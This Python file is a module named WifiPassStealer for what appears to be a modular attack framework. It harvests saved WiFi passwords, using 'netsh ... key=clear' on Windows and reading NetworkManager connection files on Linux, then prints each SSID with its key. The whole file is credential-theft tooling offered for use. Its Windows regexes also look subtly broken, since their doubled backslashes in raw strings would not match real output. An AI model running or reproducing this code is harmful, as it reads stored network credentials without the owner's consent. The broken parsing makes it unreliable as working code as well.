import subprocess
import sys
import re
import os
from core.base_module import BaseModule
from rich.console import Console
from rich.table import Table

class WifiPassStealer(BaseModule):
    """Extracts saved WiFi passwords from the system."""

    def get_options(self):
        """Returns the options for this module."""
        return {
            'TARGET_HOST': ['localhost', 'Note: This module runs locally. This is for metadata.']
        }

    def _get_windows_passwords(self, console):
        """Extracts WiFi passwords on Windows."""
        try:
            profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, stderr=subprocess.DEVNULL)
            profile_names = re.findall(r"All User Profile\\s*:\\s*(.*)", profiles_data)
            
            if not profile_names:
                console.print("[*] No WiFi profiles found on this Windows machine.")
                return

            table = Table(title="Saved WiFi Networks (Windows)")
            table.add_column("SSID", style="cyan")
            table.add_column("Password", style="green")

            for name in profile_names:
                try:
                    profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name.strip(), 'key=clear'], text=True)
                    password = re.search(r"Key Content\\s*:\\s*(.*)", profile_info)
                    if password:
                        table.add_row(name.strip(), password.group(1).strip())
                    else:
                        table.add_row(name.strip(), "[red]N/A (Open Network)[/red]")
                except subprocess.CalledProcessError:
                    table.add_row(name.strip(), "[red]Error reading profile[/red]")
            
            console.print(table)

        except (FileNotFoundError, subprocess.CalledProcessError) as e:
            console.print(f"[!] Error executing 'netsh': {e}", style="bold red")

    def _get_linux_passwords(self, console):
        """Extracts WiFi passwords on Linux (NetworkManager)."""
        nm_path = "/etc/NetworkManager/system-connections/"
        if not os.path.exists(nm_path) or not os.access(nm_path, os.R_OK):
            console.print(f"[*] NetworkManager path not found or not accessible: {nm_path}", style="yellow")
            console.print("[!] This module requires root privileges to read connection files on Linux.")
            return

        table = Table(title="Saved WiFi Networks (Linux/NetworkManager)")
        table.add_column("SSID", style="cyan")
        table.add_column("Password", style="green")

        try:
            for filename in os.listdir(nm_path):
                ssid, psk = None, None
                with open(os.path.join(nm_path, filename), 'r') as f:
                    for line in f:
                        if line.strip().startswith('ssid='):
                            ssid = line.split('=', 1)[1].strip()
                        if line.strip().startswith('psk='):
                            psk = line.split('=', 1)[1].strip()
                if ssid:
                    table.add_row(ssid, psk or "[red]N/A[/red]")
            console.print(table)
        except Exception as e:
            console.print(f"[!] Error reading NetworkManager files: {e}", style="bold red")

    def run(self, options):
        """Executes the WiFi password stealer."""
        console = Console()
        console.print("[*] Attempting to extract saved WiFi passwords...")

        if sys.platform == "win32":
            self._get_windows_passwords(console)
        elif sys.platform.startswith("linux"):
            self._get_linux_passwords(console)
        else:
            console.print(f"[!] Unsupported operating system: {sys.platform}", style="bold red")